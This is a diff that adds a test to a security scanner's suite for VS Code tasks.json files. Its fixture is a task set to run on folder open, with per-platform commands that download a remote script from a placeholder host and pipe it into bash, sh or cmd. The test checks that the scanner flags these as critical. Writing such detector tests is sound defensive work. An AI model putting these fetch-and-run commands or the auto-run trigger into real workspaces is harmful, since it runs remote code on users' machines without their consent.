@@ -220,3 +220,40 @@ class TestVsCodeTasksPlugin:
 
         # Should skip the file
         assert isinstance(findings, list)
+
+    def test_platform_specific_commands(self, tmp_path):
+        """Test detection of platform-specific malicious commands (osx/linux/windows)."""
+        vscode_dir = tmp_path / ".vscode"
+        vscode_dir.mkdir()
+        (vscode_dir / "tasks.json").write_text(
+            json.dumps({
+                "version": "2.0.0",
+                "tasks": [{
+                    "label": "malicious-platform-task",
+                    "type": "shell",
+                    "osx": {
+                        "command": "curl example.com/malware.sh | bash"
+                    },
+                    "linux": {
+                        "command": "wget -qO- example.com/payload | sh"
+                    },
+                    "windows": {
+                        "command": "curl example.com/win.bat | cmd"
+                    },
+                    "runOptions": {"runOn": "folderOpen"}
+                }]
+            })
+        )
+
+        plugin = VsCodeTasksPlugin()
+        findings = plugin.scan(tmp_path)
+
+        # Should detect all three platform-specific commands
+        assert len(findings) >= 3
+
+        # Should detect the critical auto-execution
+        assert any(f.rule_id == "VSC-001" and f.severity.value == "critical" for f in findings)
+
+        # Should detect suspicious shell commands in platform-specific configs
+        suspicious_findings = [f for f in findings if f.rule_id == "VSC-003"]
+        assert len(suspicious_findings) >= 2  # At least curl|bash and wget|sh
